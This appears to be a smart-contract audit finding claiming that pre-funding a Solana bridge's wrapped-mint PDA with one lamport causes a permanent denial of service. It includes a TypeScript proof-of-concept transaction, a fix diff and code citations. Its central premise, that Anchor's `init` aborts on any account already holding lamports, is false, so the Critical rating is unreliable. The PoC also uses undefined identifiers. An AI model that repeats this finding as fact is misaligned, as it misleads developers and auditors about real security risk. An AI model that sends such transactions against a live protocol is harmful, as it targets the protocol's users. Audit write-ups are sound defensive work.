### Title
Attacker Can Pre-Fund Wrapped Mint PDA to Cause Permanent `deploy_token` DoS - (File: `solana/programs/bridge_token_factory/src/instructions/user/deploy_token.rs`)

### Summary
The `deploy_token` instruction in the Solana bridge program uses Anchor's `init` constraint (not `init_if_needed`) for the wrapped mint PDA. Because the PDA address is fully deterministic from publicly known inputs, an attacker can pre-fund that address with lamports before any legitimate `deploy_token` call, causing the `init` constraint to permanently fail. This permanently prevents the wrapped token from being deployed on Solana, blocking finalization of any in-flight NEAR→Solana transfers for that token and irrecoverably locking user funds.

---

### Finding Description

In `deploy_token.rs`, the `mint` account is declared with the `init` constraint:

```rust
#[account(
    init,
    payer = common.payer,
    seeds = [WRAPPED_MINT_SEED, data.payload.token.to_hashed_bytes().as_ref()],
    bump,
    mint::decimals = std::cmp::min(MAX_ALLOWED_DECIMALS, data.payload.decimals),
    mint::authority = authority,
)]
pub mint: Box<Account<'info, Mint>>,
``` [1](#0-0) 

The PDA is derived from two fully public inputs:

- `WRAPPED_MINT_SEED = b"wrapped_mint"` — a hardcoded constant.
- `data.payload.token.to_hashed_bytes()` — a deterministic function of the NEAR token address string (SHA-256 hash if `> 32` bytes, zero-padded otherwise). [2](#0-1) [3](#0-2) 

Because the program ID is known once deployed and the NEAR token address is a public NEAR account ID, any observer can compute the exact PDA address off-chain before `deploy_token` is ever called.

Anchor's `init` constraint requires the target account to have **zero lamports** (be completely uninitialized). On Solana, anyone can transfer lamports to any address — including a PDA — without the program's cooperation. Sending even 1 lamport to the PDA address creates a funded system-owned account at that address. When Anchor subsequently tries to `init` the account, it detects non-zero lamports and aborts the transaction with an "account already in use" error.

The `deploy_token` entry point in `lib.rs` has no fallback path and no retry mechanism:

```rust
pub fn deploy_token(ctx: Context<DeployToken>, data: SignedPayload<DeployTokenPayload>) -> Result<()> {
    data.verify_signature((), &ctx.accounts.common.config.derived_near_bridge_address)?;
    ctx.accounts.initialize_token_metadata(data.payload)?;
    Ok(())
}
``` [4](#0-3) 

Every subsequent call to `deploy_token` for that token will fail identically as long as the attacker's lamports remain in the PDA. Since there is no mechanism to close or reclaim a system account funded by an external transfer, the DoS is permanent.

---

### Impact Explanation

**Severity: Critical — Permanent irrecoverable lock of user funds in bridge flows.**

The `deploy_token` instruction is a prerequisite for any NEAR→Solana transfer of a wrapped token. The bridge flow is:

1. User initiates a transfer on NEAR (funds are locked/burned on NEAR).
2. A relayer calls `deploy_token` on Solana to register the wrapped mint (if not yet deployed).
3. A relayer calls `finalize_transfer` on Solana to mint/release tokens to the recipient.

If step 2 is permanently blocked, step 3 can never execute (the mint account does not exist). The user's funds locked on NEAR cannot be recovered because the NEAR-side lock/burn is already committed. This constitutes an irrecoverable lock of user funds in the bridge flow, matching the Critical impact tier.

---

### Likelihood Explanation

**Likelihood: High.**

- The NEAR token address is public information.
- The program ID is public once deployed.
- The PDA derivation (`find_program_address([b"wrapped_mint", token.to_hashed_bytes()], program_id)`) is trivially computable off-chain.
- The attack requires only a standard SOL transfer (a single system-program instruction) costing a fraction of a cent.
- No privileged access, leaked keys, or colluding parties are required.
- The attacker can monitor the NEAR chain for new token registrations and front-run the `deploy_token` call.

---

### Recommendation

Replace the `init` constraint with `init_if_needed` on the `mint` account, enabling the instruction to succeed whether or not the account was previously created:

```diff
- #[account(
-     init,
+ #[account(
+     init_if_needed,
      payer = common.payer,
      seeds = [WRAPPED_MINT_SEED, data.payload.token.to_hashed_bytes().as_ref()],
      bump,
      mint::decimals = std::cmp::min(MAX_ALLOWED_DECIMALS, data.payload.decimals),
      mint::authority = authority,
  )]
  pub mint: Box<Account<'info, Mint>>,
```

And enable the `init-if-needed` feature in `Cargo.toml`:

```toml
anchor-lang = { version = "...", features = ["init-if-needed"] }
```

Alternatively, use a two-phase approach: separate mint creation from metadata registration, or validate that the existing account is a properly initialized mint with the correct authority before proceeding.

---

### Proof of Concept

```typescript
import { PublicKey } from "@solana/web3.js";
import { createHash } from "crypto";

// Publicly known inputs
const programId = new PublicKey("<bridge_token_factory_program_id>");
const nearTokenAddress = "usdt.tether-token.near"; // any NEAR token

// Replicate to_hashed_bytes() logic
function toHashedBytes(token: string): Buffer {
  const bytes = Buffer.from(token, "utf8");
  if (bytes.length > 32) {
    return Buffer.from(createHash("sha256").update(bytes).digest());
  }
  const padded = Buffer.alloc(32);
  bytes.copy(padded);
  return padded;
}

// Compute the wrapped mint PDA — same derivation as the program
const [mintPDA] = PublicKey.findProgramAddressSync(
  [Buffer.from("wrapped_mint"), toHashedBytes(nearTokenAddress)],
  programId
);
console.log("Target mint PDA:", mintPDA.toBase58());

// Attacker pre-funds the PDA with 1 lamport via a system transfer.
// After this, every deploy_token call for this token fails permanently
// with "account already in use" because init requires zero lamports.
const attackTx = new Transaction().add(
  SystemProgram.transfer({
    fromPubkey: attackerKeypair.publicKey,
    toPubkey: mintPDA,
    lamports: 1,
  })
);
await sendAndConfirmTransaction(connection, attackTx, [attackerKeypair]);

// Now any legitimate deploy_token call for nearTokenAddress will fail.
// Users who initiated NEAR→Solana transfers for this token have their
// funds permanently locked on NEAR with no recovery path.
```

### Citations

**File:** solana/programs/bridge_token_factory/src/instructions/user/deploy_token.rs (L23-34)
```rust
impl StringExt for String {
    fn to_hashed_bytes(&self) -> [u8; 32] {
        let bytes = self.as_bytes();
        if bytes.len() > 32 {
            let hash = hash(bytes);
            hash.to_bytes()
        } else {
            let mut padded_bytes = [0u8; 32];
            padded_bytes[..bytes.len()].copy_from_slice(bytes);
            padded_bytes
        }
    }
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/deploy_token.rs (L45-53)
```rust
    #[account(
        init,
        payer = common.payer,
        seeds = [WRAPPED_MINT_SEED, data.payload.token.to_hashed_bytes().as_ref()],
        bump,
        mint::decimals = std::cmp::min(MAX_ALLOWED_DECIMALS, data.payload.decimals),
        mint::authority = authority,
    )]
    pub mint: Box<Account<'info, Mint>>,
```

**File:** solana/programs/bridge_token_factory/src/constants.rs (L19-19)
```rust
pub const WRAPPED_MINT_SEED: &[u8] = b"wrapped_mint";
```

**File:** solana/programs/bridge_token_factory/src/lib.rs (L66-76)
```rust
    pub fn deploy_token(
        ctx: Context<DeployToken>,
        data: SignedPayload<DeployTokenPayload>,
    ) -> Result<()> {
        msg!("Deploying token");

        data.verify_signature((), &ctx.accounts.common.config.derived_near_bridge_address)?;
        ctx.accounts.initialize_token_metadata(data.payload)?;

        Ok(())
    }
```
